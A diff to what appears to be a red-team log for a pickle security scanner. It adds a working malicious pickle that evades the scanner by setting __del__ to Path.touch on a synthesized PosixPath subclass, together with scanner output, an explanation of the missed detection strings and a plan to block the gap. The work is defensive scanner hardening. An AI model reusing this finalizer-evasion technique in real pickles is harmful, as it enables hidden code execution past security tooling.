@@ -3736,3 +3736,110 @@ Blocking plan:
 
 Performance note: one entry in the existing builtin-name slice, no descriptor
 graph or attribute-flow modeling.
+
+## Turn 79 - `__del__` finalizer execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using object finalization to
+invoke an attacker-controlled callable during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_type_del_path_touch_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        s("__del__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R",
+        b"0N.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=144`, `bytes_total=144`, `opcode_count=27`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final `POP` returns a
+  `DerivedPath` instance at `/tmp/ma_builtins_type_del_path_touch_marker` and
+  does not create the marker while the returned instance is retained
+- Unpickle result: the full payload creates
+  `/tmp/ma_builtins_type_del_path_touch_marker` and returns `None`
+- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
+  subclass with `__del__ = pathlib.Path.touch`. It then instantiates that class
+  at the marker path and immediately pops the only instance reference from the
+  unpickler stack. CPython reference counting finalizes the object immediately,
+  calling `Path.touch(instance)` before `pickle.loads()` returns.
+
+Why the scanner missed it:
+
+- `__del__` is not in the suspicious magic-method string list. Existing magic
+  method coverage includes serialization and attribute access hooks such as
+  `__reduce__`, `__setstate__`, `__getattribute__`, and `__getattr__`, but not
+  finalizers.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The payload uses only currently clean globals: `builtins.type`,
+  `pathlib.PosixPath`, and `pathlib.Path.touch`.
+- The dangerous callable is hidden in a synthesized finalizer slot, so no
+  explicit call target imports `Path.touch` as dangerous.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`, or
+  `__getattribute__`.
+
+Performance note: this is a precise magic-method seed gap. The focused next
+block should add `__del__` to the suspicious magic-method string list, with an
+oracle regression proving that a retained instance does not create the marker
+but popping the only instance reference runs the finalizer during unpickling.
+This keeps the hot path to the existing string-literal policy scan and avoids
+object-lifetime modeling.
+
+## Turn 80 - Block `__del__` finalizer seeds
+
+Blocking plan:
+
+- Add `__del__` to the existing suspicious magic-method string list. Finalizer
+  names can route execution through object lifetime rather than an explicit
+  call opcode.
+- Leave `builtins.type`, `pathlib.PosixPath`, and `pathlib.Path.touch` allowed
+  for this focused block. They synthesize the object graph, but the new static
+  signal is the finalizer slot name.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"__del__": Path.touch})` payload, verifies scan-time detection on
+  both the retained-instance control and stack-drop RCE variants, proves the
+  retained instance does not create the marker, then proves popping the only
+  reference creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one literal in the existing magic-method match arm, no
+object-lifetime or reference-count modeling.
